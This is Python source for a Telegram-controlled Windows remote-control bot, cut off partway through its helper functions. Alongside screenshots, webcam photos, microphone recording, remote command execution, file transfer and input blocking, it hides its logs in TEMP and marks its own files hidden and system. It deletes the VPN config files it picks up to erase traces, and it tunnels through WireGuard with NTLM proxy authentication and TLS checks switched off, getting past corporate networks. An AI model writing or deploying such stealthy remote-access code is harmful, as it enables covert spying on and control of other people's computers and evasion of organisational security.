# ================================
# PC Remote Control (PCTools) Bot — ПОЛНАЯ СБОРКА (FIXED)
# 100% СДЕЛАНО + ИСПРАВЛЕНИЯ БАГОВ
# НИ ОДНА ФУНКЦИЯ НЕ УДАЛЕНА
# ================================

import telebot
import os
import comtypes
import webbrowser
import requests
import platform
import ctypes
import sys
import winreg 
import mouse
import cv2
import psutil
import subprocess
import random
import time
import sounddevice as sd
import numpy as np
import threading
import datetime
import uuid
import socket   
import platform
import json
import ssl
import math
import wave
import struct
import urllib3
import tempfile

from PIL import Image, ImageGrab, ImageDraw
from pySmartDL import SmartDL
from telebot import types
from telebot import apihelper
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from pynput import keyboard as pynput_k, mouse as pynput_m
from scipy.io.wavfile import write
import urllib3.util.connection
import urllib.request

class StealthLogger:
    def __init__(self, filename="win_sys_diag.log"):
        # Сохраняем оригинальную консоль для отладки
        self.original_stdout = sys.stdout
        self.original_stderr = sys.stderr
        
        # Прячем лог в системную папку TEMP
        self.log_dir = tempfile.gettempdir()
        self.filepath = os.path.join(self.log_dir, filename)
        
        try:
            self.file = open(self.filepath, "w", encoding="utf-8")
        except:
            self.file = None

    def write(self, message):
        # 1. Пытаемся вывести текст в консоль (если мы тестируем руками)
        if self.original_stdout:
            try:
                self.original_stdout.write(message)
                self.original_stdout.flush()
            except:
                pass # Если консоли нет (скрытый EXE), просто игнорируем
                
        # 2. ОДНОВРЕМЕННО пишем всё в скрытый файл
        if self.file:
            try:
                self.file.write(message)
                self.file.flush()
            except: 
                pass

    def flush(self):
        if self.original_stdout:
            try: self.original_stdout.flush()
            except: pass
            
    def clear(self):
        # Стираем данные, не удаляя сам файл
        if self.file:
            try:
                self.file.truncate(0)
                self.file.seek(0)
            except: pass

# Включаем перехват
stealth_logger = StealthLogger()
sys.stdout = stealth_logger
sys.stderr = stealth_logger

# Глобальные переменные для записи
recording_flag = False
recording_data = []
recording_thread = None
recording_filename = "recorded_audio.wav"

# === ФИКС ПРОБЛЕМ С СЕТЬЮ (TIMEOUTS) ===
apihelper.READ_TIMEOUT = 180
# Время на подключение
apihelper.CONNECT_TIMEOUT = 15

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


apihelper.proxy = None

try:
    # Пытаемся включить поддержку High-DPI
    ctypes.windll.shcore.SetProcessDpiAwareness(1)
except Exception:
    try:
        ctypes.windll.user32.SetProcessDPIAware()
    except Exception:
        pass

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

sys_proxies = urllib.request.getproxies()
session = requests.Session()
session.verify = False
session.trust_env = True
apihelper.SESSION = session

if sys_proxies:
    if 'https' not in sys_proxies and 'http' in sys_proxies:
        sys_proxies['https'] = sys_proxies['http']
    
    apihelper.proxy = sys_proxies
    print(f"🕵️ Найден корпоративный прокси: {sys_proxies['https']}")
    
    # --- УМНАЯ ПРОВЕРКА АВТОРИЗАЦИИ ---
    try:
        # Стучимся в Telegram (или на ваше Зеркало)
        test_res = session.get("https://api.yourmirror.top", timeout=10)
        
        if test_res.status_code == 407:
            print("⚠️ Прокси требует доменную авторизацию! Включаю NTLM...")
            from requests_negotiate_sspi import HttpNtlmAuth
            session.auth = HttpNtlmAuth()
        else:
            print("✅ Прокси пускает без пароля.")
            
    except Exception as e:
        print(f"⚠️ Ошибка при тесте прокси: {e}")
else:
    apihelper.proxy = None
    print("ℹ️ Прямое соединение (без системного прокси).")

CORP_PROXY = apihelper.proxy
CORP_SESSION = session

OFFICIAL_API = "https://api.telegram.org/bot{0}/{1}"
MIRROR_API = "https://api.yourmirror.top:443/bot{0}/{1}"

class WGManager:
    process = None
    proxy_url = "socks5h://127.0.0.1:10808"
    storage_file = "win_sys_net.json" 
    
    # Переносим временный конфиг в глубокую системную папку Temp Windows
    temp_conf_path = os.path.join(tempfile.gettempdir(), "sys_bridge_cache.conf")

    @staticmethod
    def get_wireproxy_path():
        if hasattr(sys, '_MEIPASS'):
            return os.path.join(sys._MEIPASS, "wireproxy.exe")
        return os.path.join(os.path.abspath(os.path.dirname(__file__)), "wireproxy.exe")

    @classmethod
    def save_config(cls, conf_text):
        try:
            # 1. Если кэш уже существует, снимаем с него защиту перед перезаписью
            # 0x80 = FILE_ATTRIBUTE_NORMAL
            if os.path.exists(cls.storage_file):
                ctypes.windll.kernel32.SetFileAttributesW(cls.storage_file, 0x80)
                
            # 2. Сохраняем свежий конфиг
            with open(cls.storage_file, "w", encoding="utf-8") as f:
                json.dump({"wg_conf": conf_text}, f)
                
            # 3. Снова вешаем "броню" (Скрытый + Системный)
            ctypes.windll.kernel32.SetFileAttributesW(cls.storage_file, 0x02 | 0x04)
            print("💾 WG Кэш успешно обновлен и скрыт.")
        except Exception as e:
            print(f"❌ Ошибка сохранения WG кэша: {e}")

    @classmethod
    def load_config(cls):
        # 1. СТАНДАРТНЫЙ ПУТЬ: Ищем конфиг в скрытом системном кэше
        if os.path.exists(cls.storage_file):
            try:
                with open(cls.storage_file, "r", encoding="utf-8") as f:
                    conf = json.load(f).get("wg_conf")
                    if conf: 
                        return conf
            except:
                pass

        # 2. СЦЕНАРИЙ НУЛЕВОГО ДНЯ: Кэша нет. Ищем физический .conf файл рядом с ботом
        current_dir = os.path.abspath(os.path.dirname(__file__))
        
        try:
            for file in os.listdir(current_dir):
                # Игнорируем наш собственный временный файл, ищем чужие
                if file.endswith(".conf") and file != "temp_wg.conf" and file != "sys_bridge_cache.conf":
                    fallback_path = os.path.join(current_dir, file)
                    
                    with open(fallback_path, "r", encoding="utf-8") as f:
                        conf_text = f.read()
                        
                    # Если внутри есть признаки WireGuard
                    if "[Interface]" in conf_text and "[Peer]" in conf_text:
                        print(f"⚠️ ОБНАРУЖЕН АВАРИЙНЫЙ КОНФИГ: {file}")
                        
                        # Сохраняем в скрытый кэш
                        cls.save_config(conf_text)
                        
                        # Заметаем следы - удаляем исходный файл
                        try:
                            os.remove(fallback_path)
                            print("🧹 Исходный файл удален.")
                        except:
                            pass
                            
                        return conf_text
        except Exception as e:
            print(f"Ошибка поиска аварийного конфига: {e}")
            
        return None

    @classmethod
    def try_local_fallback(cls):
        """Аварийный поиск .conf файла рядом со скриптом"""
        
        # МАГИЯ ПУТЕЙ: Ищем папку с самим .exe файлом, а не папку распаковки
        if getattr(sys, 'frozen', False):
            current_dir = os.path.dirname(sys.executable)
        else:
            current_dir = os.path.abspath(os.path.dirname(__file__))
        
        try:
            for file in os.listdir(current_dir):
                if file.endswith(".conf") and file not in ["temp_wg.conf", "sys_bridge_cache.conf"]:
                    fallback_path = os.path.join(current_dir, file)
                    
                    with open(fallback_path, "r", encoding="utf-8") as f:
                        conf_text = f.read()
                        
                    if "[Interface]" in conf_text and "[Peer]" in conf_text:
                        print(f"⚠️ НАЙДЕН АВАРИЙНЫЙ КОНФИГ: {file}. Пробую применить...")
                        
                        success, msg = cls.apply_config(conf_text, save=True)
                        
                        if success:
                            try:
                                os.remove(fallback_path)
                                print(f"🧹 Исходный файл {file} удален (маскировка).")
                            except:
                                pass
                            return True, "✅ Аварийный конфиг успешно применен."
                        else:
                            return False, f"❌ Аварийный конфиг не работает: {msg}"
                            
        except Exception as e:
            return False, f"Ошибка поиска аварийного конфига: {e}"
            
        return False, "Локальных .conf файлов не найдено."

    @classmethod
    def auto_connect(cls):
        conf = cls.load_config()
        if not conf:
            return False, "Нет сохраненного конфига"
        return cls.apply_config(conf, save=False)

    @classmethod
    def apply_config(cls, conf_text, save=True):
        cls.stop() # Жестко убиваем все старые процессы

        if save:
            cls.save_config(conf_text)

        # 1. Очищаем конфиг от старых SOCKS и MTU
        lines = []
        for line in conf_text.split('\n'):
            if "[Socks5]" in line or "BindAddress" in line or "MTU" in line.upper():
                continue
            lines.append(line)
        clean_conf = "\n".join(lines)
        
        # 2. Добавляем SOCKS5 и жесткий MTU = 1280 (защита от фрагментации пакетов)
        # MTU вставляем сразу после [Interface]
        modified_conf = clean_conf.replace("[Interface]", "[Interface]\nMTU = 1280")
        modified_conf += "\n\n[Socks5]\nBindAddress = 127.0.0.1:10808\n"
        
        with open(cls.temp_conf_path, "w", encoding="utf-8") as f:
            f.write(modified_conf)

        wp_exe = cls.get_wireproxy_path()
        if not os.path.exists(wp_exe):
            return False, "❌ Ошибка: wireproxy.exe не найден!"

        CREATE_NO_WINDOW = 0x08000000
        cls.process = subprocess.Popen(
            [wp_exe, "-c", cls.temp_conf_path],
            creationflags=CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        time.sleep(3) 
        
        # Проверяем, не умер ли процесс мгновенно (например, порт все еще занят)
        if cls.process.poll() is not None:
            return False, "❌ Ошибка: wireproxy.exe мгновенно закрылся (Порт 10808 занят другой программой?)"

        time.sleep(12) # Ждем хэндшейка оставшееся время

        try:
            os.environ['http_proxy'] = cls.proxy_url
            os.environ['https_proxy'] = cls.proxy_url
            os.environ['HTTP_PROXY'] = cls.proxy_url
            os.environ['HTTPS_PROXY'] = cls.proxy_url

            test_url = f"https://api.telegram.org/bot{bot_token}/getMe"
            clean_session = requests.Session()
            
            success = False
            last_err = ""
            
            for attempt in range(1, 4):
                try:
                    res = clean_session.get(test_url, timeout=30) 
                    
                    if res.status_code == 200:
                        success = True
                        break 
                    else:
                        last_err = f"API вернул код {res.status_code}"
                except Exception as e:
                    last_err = str(e)
                    time.sleep(5) 
            
            if success:
                apihelper.SESSION = clean_session
                apihelper.proxy = {'https': cls.proxy_url, 'http': cls.proxy_url}
                apihelper.API_URL = OFFICIAL_API 
                
                return True, "✅ Трафик ЖЕЛЕЗОБЕТОННО переведен в WireGuard. Туннель стабилен."
            else:
                cls.stop()
                return False, f"❌ Туннель не пробился после 3 попыток.\nПоследняя ошибка: {last_err}"
                
        except Exception as e:
            cls.stop()
            return False, f"⚠️ Критическая ошибка WG:\n{e}"

    @classmethod
    def stop(cls):
        if cls.process:
            try:
                cls.process.kill()
                cls.process.wait()
            except: pass
            cls.process = None
        
        # === БЕСШУМНОЕ УБИЙСТВО ЗОМБИ ===
        # Используем subprocess вместо os.system, чтобы консоль не мигала!
        CREATE_NO_WINDOW = 0x08000000
        try:
            subprocess.call(
                ["taskkill", "/F", "/IM", "wireproxy.exe"],
                creationflags=CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except: pass
        
        if os.path.exists(cls.temp_conf_path):
            try: os.remove(cls.temp_conf_path)
            except: pass
            
        for key in ['http_proxy', 'https_proxy', 'HTTP_PROXY', 'HTTPS_PROXY']:
            if key in os.environ:
                del os.environ[key]

        apihelper.proxy = None

# ====== КОНФИГУРАЦИЯ ======
my_id = YOURID
bot_token = 'BOT-TOKEN'
bot = telebot.TeleBot(bot_token)

# Инициализация для MessageBox
MessageBox = ctypes.windll.user32.MessageBoxW

class User:
    def __init__(self):
        pass

    # --- состояние ---
    curs = 50             # шаг курсора мыши
    state = None          # текущее состояние пользователя
    last_wg_conf = None
    
    # Флаги ожидания ввода
    wait_volume = False
    wait_media = False
    wait_calc_value = False
    
    # Хранилище данных
    last_media_path = None
    calc_value = None
    web_url = None
    urldown = None

class InputManager:
    # Слушатели (Listeners)
    k_listener = None
    m_listener = None
    
    # Флаги состояния
    keyboard_blocked = False
    mouse_blocked = False
    mouse_swapped = False



# --- ГЛАВНОЕ ---
# ================================
# КЛАВИАТУРЫ (ПОЛНАЯ СБОРКА)
# ================================

# --- ГЛАВНОЕ МЕНЮ ---
menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
btnscreen = types.KeyboardButton('📷Быстрый скриншот')
btnscreendoc = types.KeyboardButton('🖼Полный скриншот')
btnwebcam = types.KeyboardButton('📹Фото вебкамеры')
btn_audio_rec = types.KeyboardButton('🎙Запись звука')
btnmouse = types.KeyboardButton('🖱Управление мышкой')
btnfiles = types.KeyboardButton('📂Файлы и процессы')
btnaddit = types.KeyboardButton('❇️Дополнительно')
btnmsgbox = types.KeyboardButton('📩Отправка уведомления')
btninfo = types.KeyboardButton('❗️Информация')

menu_keyboard.row(btnscreen, btnscreendoc)
menu_keyboard.row(btnwebcam, btn_audio_rec)   # Медиа (Фото + Звук)
menu_keyboard.row(btnmouse, btnfiles)         # Управление
menu_keyboard.row(btnaddit, btnmsgbox)        # Инструменты
menu_keyboard.row(btninfo)                    # Инфо

# --- МЕНЮ ФАЙЛОВ ---
files_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
btnstart = types.KeyboardButton('✔️Запустить')
btnkill = types.KeyboardButton('❌Замочить процесс')
btnplist = types.KeyboardButton('⚙️ Процессы (Окна)')
btnvolume = types.KeyboardButton('🔊Громкость')
btndown = types.KeyboardButton('⬇️Скачать файл')
btnupl = types.KeyboardButton('⬆️Загрузить файл')
btnurldown = types.KeyboardButton('🔗Загрузить по ссылке')
btnback = types.KeyboardButton('⏪Назад⏪')
btnmedia = types.KeyboardButton('🎬 Медиа плеер')

files_keyboard.row(btnstart, btnkill)
files_keyboard.row(btnplist, btnvolume)
files_keyboard.row(btnmedia)
files_keyboard.row(btndown, btnupl)
files_keyboard.row(btnurldown, btnback)

# --- МЕНЮ ДОПОЛНИТЕЛЬНО ---
additionals_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
btncalc = types.KeyboardButton('🧮Калькулятор')
btnweb = types.KeyboardButton('🔗Перейти по ссылке')
btncmd = types.KeyboardButton('✅Выполнить команду')
btnoff = types.KeyboardButton('⛔️Выключить компьютер')
btnreb = types.KeyboardButton('♻️Перезагрузить компьютер')
btninfo2 = types.KeyboardButton('🖥О компьютере')
btnback2 = types.KeyboardButton('⏪Назад⏪')
btn_bot_manage = types.KeyboardButton('💀 Управление ботом')
btn_hotkeys = types.KeyboardButton('⌨️ Горячие клавиши')
btn_input_mgr = types.KeyboardButton('🛠 Менеджер ввода')
btn_update_bot = types.KeyboardButton('🔄 Обновить бота')
btn_logs = types.KeyboardButton('📄 Выгрузить логи')

additionals_keyboard.row(btnoff, btnreb)
additionals_keyboard.row(btncmd, btnweb)
additionals_keyboard.row(btncalc, btn_hotkeys)
additionals_keyboard.row(btn_input_mgr, btn_update_bot)
additionals_keyboard.row(btninfo2, btn_bot_manage)
additionals_keyboard.row(btn_logs, btnback2)

# --- МЕНЮ МЫШИ (3x3) ---
mouse_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
btnup = types.KeyboardButton('⬆️')
btndown_m = types.KeyboardButton('⬇️')
btnleft = types.KeyboardButton('⬅️')
btnright = types.KeyboardButton('➡️')
btn_lkm = types.KeyboardButton('🖱 ЛКМ')
btn_rkm = types.KeyboardButton('🖱 ПКМ')
btn_dbl = types.KeyboardButton('🖱 2xЛКМ')
btnback3 = types.KeyboardButton('⏪Назад⏪')
btncurs = types.KeyboardButton('📏 Размах')

mouse_keyboard.row(btn_lkm, btnup, btn_rkm)
mouse_keyboard.row(btnleft, btn_dbl, btnright)
mouse_keyboard.row(btnback3, btndown_m, btncurs)

# --- ГОРЯЧИЕ КЛАВИШИ ---
hotkeys_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
btn_altf4 = types.KeyboardButton('💥 Alt + F4')
btn_win_d = types.KeyboardButton('📉 Свернуть всё')
btn_taskmgr = types.KeyboardButton('📊 Диспетчер задач')
btn_enter = types.KeyboardButton('✅ Enter')
btn_space = types.KeyboardButton('⏯ Пробел')
btn_f = types.KeyboardButton('🔲 Клавиша F')
btn_f11 = types.KeyboardButton('🖥 Клавиша F11')
btn_esc = types.KeyboardButton('❌ Клавиша Esc')
btn_back_hot = types.KeyboardButton('⏪Назад⏪')

hotkeys_keyboard.row(btn_space, btn_f, btn_f11)
hotkeys_keyboard.row(btn_altf4, btn_win_d, btn_esc)
hotkeys_keyboard.row(btn_taskmgr, btn_enter)
hotkeys_keyboard.row(btn_back_hot)

# --- МЕНЕДЖЕР ВВОДА ---
input_manager_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
btn_block_kb = types.KeyboardButton('⌨️ Блок. Клавиатуры')
btn_block_ms = types.KeyboardButton('🖱 Блок. Мыши')
btn_swap_ms = types.KeyboardButton('🔄 Инверсия ЛКМ/ПКМ')
btn_unblock_all = types.KeyboardButton('🔓 РАЗБЛОКИРОВАТЬ ВСЁ')
btn_back_mgr = types.KeyboardButton('⏪Назад⏪')

input_manager_keyboard.row(btn_block_kb, btn_block_ms)
input_manager_keyboard.row(btn_swap_ms)
input_manager_keyboard.row(btn_unblock_all)
input_manager_keyboard.row(btn_back_mgr)

# --- МЕНЮ ЗАПИСИ ЗВУКА (НОВОЕ) ---
audio_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
btn_rec_start = types.KeyboardButton('🔴 НАЧАТЬ ЗАПИСЬ')
btn_rec_stop = types.KeyboardButton('⏹ ОСТАНОВИТЬ')
btn_rec_back = types.KeyboardButton('⏪Назад⏪')

audio_keyboard.row(btn_rec_start, btn_rec_stop)
audio_keyboard.row(btn_rec_back)

# ================================
# ИНФО СООБЩЕНИЕ
# ================================
info_msg = '''
*📚 ПОЛНЫЙ СПРАВОЧНИК КОМАНД*

*🏠 ГЛАВНОЕ МЕНЮ*
_📷Быстрый скриншот_ — Скриншот экрана (сжатый)
_🖼Полный скриншот_ — Скриншот файлом (HD, с отрисовкой курсора)
_📹Фото вебкамеры_ — Фото с вебки (с функцией авто-починки драйвера)
_🎙Запись звука_ — Запись голоса с микрофона (24kHz, авто-отправка)
_🖱Управление мышкой_ — Меню эмуляции мыши
_📩Отправка уведомления_ — Вывести окно с сообщением поверх всех окон

*📂 ФАЙЛЫ И ПРОЦЕССЫ*
_⚙️ Процессы_ — Топ программ по потреблению ОЗУ + Поиск по имени
_❌Замочить процесс_ — Принудительное завершение (включая системные, если от Админа)
_✔️Запустить_ — Открыть файл или программу
_🔊Громкость_ — Изменить громкость Windows (0-100%)
_🎬 Медиа плеер_ — Запуск видео/музыки и управление (Пауза/Стоп)
_⬇️Скачать файл_ — Скачать файл с ПК в Телеграм
_⬆️Загрузить файл_ — Загрузить файл на ПК
_🔗Загрузить по ссылке_ — Скачать файл из интернета на ПК

*🖱 МЫШЬ И ВВОД*
_ЛКМ / ПКМ / 2xЛКМ_ — Клики мышкой
_📏 Размах_ — Настройка скорости движения курсора
_🛠 Менеджер ввода_ — Блокировка физической клавиатуры и мыши (Защита от детей)

*❇️ ДОПОЛНИТЕЛЬНО*
_⌨️ Горячие клавиши_ — Нажатие Alt+F4, Win+D (свернуть), Ctrl+Shift+Esc и др.
_✅Выполнить команду_ — CMD консоль (присылает вывод команды обратно)
_🧮Калькулятор_ — Запуск калькулятора с вводом чисел
_💀 Управление ботом_ — Удаление из автозагрузки, Самоуничтожение, Остановка
_🔄 Обновить бота_ — Автоматическое обновление EXE файла по ссылке
_⛔️/♻️ Питание_ — Выключение и Перезагрузка компьютера
'''

try:
    bot.send_message(my_id, "✅ ПК запущен и готов к работе", reply_markup=menu_keyboard)
except Exception as e:
    print(f"Ошибка отправки стартового сообщения: {e}")

# ================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ================================

def try_repair_camera():
    """
    Пытается 'починить' камеру программными методами без админки:
    1. Переключение на DirectShow (DSHOW)
    2. Увеличение таймаута
    """
    # Список методов захвата (API). 
    # CAP_DSHOW часто помогает, если камера "зависла" или показывает черный экран
    backends = [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY]
    
    for backend in backends:
        try:
            # Пробуем открыть с конкретным бекендом
            cap = cv2.VideoCapture(0, backend)
            
            # Настройка таймаута и разрешения (иногда помогает "разбудить")
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            
            if cap.isOpened():
                # Читаем несколько кадров для "прогрева" камеры (автобаланс белого)
                for _ in range(5):
                    cap.read()
                
                # Финальный кадр
                ret, frame = cap.read()
                cap.release()
                
                if ret:
                    return True, frame
        except:
            continue
            
    return False, None

def get_screenshot():
    """Создает скриншот с отрисовкой курсора-стрелки"""
    try:
        # Скриншот экрана
        screen = ImageGrab.grab()
        
        # Получаем позицию мыши
        try:
            x, y = mouse.get_position()
            
            # Рисуем курсор (Стрелочка вместо круга)
            draw = ImageDraw.Draw(screen)
            
            # Координаты полигона (форма курсора-стрелки)
            # x,y - кончик стрелки
            cursor_points = [
                (x, y),             # Носик
                (x, y + 20),        # Левый низ
                (x + 5, y + 15),    # Вырез
                (x + 14, y + 24),   # Хвостик (низ)
                (x + 16, y + 22),   # Хвостик (верх)
                (x + 7, y + 13),    # Вырез (право)
                (x + 13, y + 13)    # Правое плечо
            ]
            
            # Рисуем: Сначала черная обводка (чуть больше), потом белая заливка
            # Чтобы было видно на любом фоне
            
            # Обводка (черная)
            draw.polygon(cursor_points, outline="black", fill="black")
            
            # Чуть сдвигаем точки внутрь или просто рисуем поверх белым (но линию outline оставляем черной)
            draw.polygon(cursor_points, outline="black", fill="white")
            
        except Exception:
            pass # Если не удалось получить мышь, делаем чистый скрин

        # Сохраняем
        # screen.png - чистый (для админа, если нужно)
        # screen_with_mouse.png - с курсором (то, что мы отправляем)
        screen.save("screen.png")
        screen.save("screen_with_mouse.png")
        
    except Exception as e:
        print(f"Ошибка создания скриншота: {e}")

def get_active_user_apps():
    """Собирает только открытые пользовательские программы и заголовки их окон"""
    apps = []
    
    # Внутренняя функция-перехватчик окон Windows
    def enum_windows_proc(hwnd, lParam):
        # Берем только видимые окна
        if ctypes.windll.user32.IsWindowVisible(hwnd):
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            if length > 0:
                buff = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
                title = buff.value
                
                # Получаем PID процесса, которому принадлежит окно
                pid = ctypes.c_ulong()
                ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                
                try:
                    proc = psutil.Process(pid.value)
                    name = proc.name().lower()
                    
                    # Исключаем системный мусор (Проводник, скрытые службы Windows)
                    ignore_list = ['explorer.exe', 'systemsettings.exe', 'applicationframehost.exe', 'textinputhost.exe', 'searchapp.exe']
                    
                    if name not in ignore_list:
                        # Формируем красивый вывод
                        apps.append(f"🔹 *{proc.name()}* (PID: `{pid.value}`)\n   📄 {title}")
                except:
                    pass
        return True

    # Запускаем системный скан
    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
    ctypes.windll.user32.EnumWindows(EnumWindowsProc(enum_windows_proc), 0)
    
    return apps

def get_process_list():
    # Список системных процессов, которые нам не интересны (мусор)
    ignore_list = ['svchost.exe', 'System', 'Idle', 'smss.exe', 'csrss.exe', 
                   'services.exe', 'lsass.exe', 'wininit.exe', 'Registry', 'RuntimeBroker.exe']
    
    procs = []
    for p in psutil.process_iter(['pid', 'name', 'memory_percent']):
        try:
            # Добавляем, если имя есть и процесс не в списке игнора
            if p.info['name'] and p.info['name'] not in ignore_list:
                procs.append(p.info)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    # Сортируем по ПОТРЕБЛЕНИЮ ПАМЯТИ (RAM), а не CPU
    # Браузеры (Opera, Chrome) всегда в топе по памяти
    procs.sort(key=lambda x: x['memory_percent'], reverse=True)
    
    # Формируем таблицу
    text = "💾 Топ процессов по ОЗУ (RAM):\n"
    text += "RAM% | PID | NAME\n"
    text += "-"*30 + "\n"
    
    # Берем топ-25 (увеличили список)
    for p in procs[:25]:
        try:
            mem = round(p['memory_percent'], 1)
            pid = p['pid']
            name = p['name']
            text += f"{mem}%  | {pid} | {name}\n"
        except:
            continue
            
    return text

def set_volume(val):
    try:
        # Инициализируем COM (если он уже открыт в этом потоке, ничего страшного не случится)
        comtypes.CoInitialize()
        
        devices = AudioUtilities.GetDeviceEnumerator()
        interface = devices.GetDefaultAudioEndpoint(0, 1) # Render
        volume = interface.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume_interface = cast(volume, POINTER(IAudioEndpointVolume))
        
        val = max(0, min(100, val))
        scalar = val / 100.0
        volume_interface.SetMasterVolumeLevelScalar(scalar, None)
        
        # Мы НЕ вызываем del и НЕ вызываем CoUninitialize.
        # Оставляем это на совесть Python GC. Это предотвращает Access Violation.
        
    except Exception as e:
        print(f"Ошибка установки громкости: {e}")

def get_volume():
    try:
        comtypes.CoInitialize()
        
        devices = AudioUtilities.GetDeviceEnumerator()
        interface = devices.GetDefaultAudioEndpoint(0, 1)
        volume = interface.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume_interface = cast(volume, POINTER(IAudioEndpointVolume))
        
        current = volume_interface.GetMasterVolumeLevelScalar()
        return int(current * 100)
    except Exception:
        return 0

def press_hotkey(combo):
    user32 = ctypes.windll.user32
    
    # Коды клавиш (Virtual-Key Codes)
    VK_MENU = 0x12    # Alt
    VK_F4 = 0x73      # F4
    VK_LWIN = 0x5B    # Левый Windows
    VK_D = 0x44       # D
    VK_RETURN = 0x0D  # Enter
    VK_CONTROL = 0x11 # Ctrl
    VK_SHIFT = 0x10   # Shift
    VK_ESCAPE = 0x1B  # Esc
    VK_SPACE = 0x20   # Пробел
    VK_F = 0x46       # Клавиша F
    VK_F11 = 0x7A     # F11

    # Умное нажатие: генерирует аппаратный скан-код и делает микро-задержку
    def tap_key(vk_code):
        scan_code = user32.MapVirtualKeyW(vk_code, 0)
        user32.keybd_event(vk_code, scan_code, 0, 0) # Нажали
        time.sleep(0.05) # Ждем 50 миллисекунд (имитация пальца)
        user32.keybd_event(vk_code, scan_code, 2, 0) # Отпустили

    try:
        if combo == "alt_f4":
            user32.keybd_event(VK_MENU, 0, 0, 0)
            user32.keybd_event(VK_F4, 0, 0, 0)
            time.sleep(0.05)
            user32.keybd_event(VK_F4, 0, 2, 0)
            user32.keybd_event(VK_MENU, 0, 2, 0)
            
        elif combo == "win_d":
            user32.keybd_event(VK_LWIN, 0, 0, 0)
            user32.keybd_event(VK_D, 0, 0, 0)
            time.sleep(0.05)
            user32.keybd_event(VK_D, 0, 2, 0)
            user32.keybd_event(VK_LWIN, 0, 2, 0)

        elif combo == "enter":
            tap_key(VK_RETURN)
            
        elif combo == "taskmgr":
            user32.keybd_event(VK_CONTROL, 0, 0, 0)
            user32.keybd_event(VK_SHIFT, 0, 0, 0)
            user32.keybd_event(VK_ESCAPE, 0, 0, 0)
            time.sleep(0.05)
            user32.keybd_event(VK_ESCAPE, 0, 2, 0)
            user32.keybd_event(VK_SHIFT, 0, 2, 0)
            user32.keybd_event(VK_CONTROL, 0, 2, 0)

        elif combo == "space":
            tap_key(VK_SPACE)

        elif combo == "f":
            tap_key(VK_F)

        elif combo == "f11":
            tap_key(VK_F11)
            
        elif combo == "esc":
            tap_key(VK_ESCAPE)

    except Exception as e:
        print(f"Ошибка нажатия клавиш: {e}")

def run_calc(value):
    # Запуск калькулятора и ввод числа через PowerShell скрипт
    cmd = f"powershell -windowstyle hidden -c \"$ws = New-Object -ComObject WScript.Shell; $ws.Run('calc'); Start-Sleep -Milliseconds 500; $ws.SendKeys('{value}')\""
    subprocess.Popen(cmd, shell=True)

# Медиа функции
def detect_active_player():
    # Актуальный список процессов для Windows 10/11
    # Video.UI.exe = "Кино и ТВ"
    # Microsoft.Media.Player.exe = Новый "Медиаплеер" (Win 11)
    # wmplayer.exe = Старый Windows Media Player
    target_processes = [
        'wmplayer.exe', 
        'vlc.exe', 
        'mpv.exe', 
        'mpc-hc.exe', 
        'potplayer.exe', 
        'video.ui.exe', 
        'microsoft.media.player.exe'
    ]
    
    active = []
    for p in psutil.process_iter(['name']):
        try:
            if p.info['name'] and p.info['name'].lower() in target_processes:
                active.append(p.info['name'])
        except:
            pass
    return list(set(active))

def play_media(path, fullscreen=False):
    """
    Запускает медиафайл.
    Если fullscreen=True, ждет запуска, наводит мышь в центр и делает двойной клик.
    """
    if not os.path.exists(path):
        bot.send_message(my_id, "❌ Файл не найден")
        return

    try:
        # Запускаем файл
        os.startfile(path)
        
        if fullscreen:
            def do_fullscreen_action():
                # 1. Ждем прогрузки плеера (увеличьте до 4-5, если ПК медленный)
                time.sleep(3.5)
                
                # 2. Получаем разрешение экрана через ctypes (чтобы найти центр)
                user32 = ctypes.windll.user32
                screen_w = user32.GetSystemMetrics(0)
                screen_h = user32.GetSystemMetrics(1)
                
                # 3. Перемещаем мышь в центр экрана
                # (Это гарантирует, что мы кликнем по видео)
                mouse.move(screen_w // 2, screen_h // 2)
                time.sleep(0.2)
                
                # 4. Двойной клик ЛЕВОЙ кнопкой
                # Это дает фокус окну И разворачивает его
                mouse.double_click(button='left')
                
                # 5. Убираем мышь в сторону, чтобы скрыть интерфейс плеера/курсор
                # (Сдвигаем в правый нижний угол)
                time.sleep(0.5)
                mouse.move(screen_w - 50, screen_h - 50)

            # Запускаем в отдельном потоке
            threading.Thread(target=do_fullscreen_action).start()
            
        bot.send_message(my_id, f"🎬 Медиа запущено: {os.path.basename(path)}")
        
    except Exception as e:
        bot.send_message(my_id, f"Ошибка запуска медиа: {e}")

def press_f11_logic():
    """Нажимает F11 через 3 секунды (для браузера)"""
    time.sleep(3.0) # Ждем пока браузер откроется
    # Нажимаем F11 (Код 0x7A)
    ctypes.windll.user32.keybd_event(0x7A, 0, 0, 0)
    ctypes.windll.user32.keybd_event(0x7A, 0, 2, 0)

def pause_media():
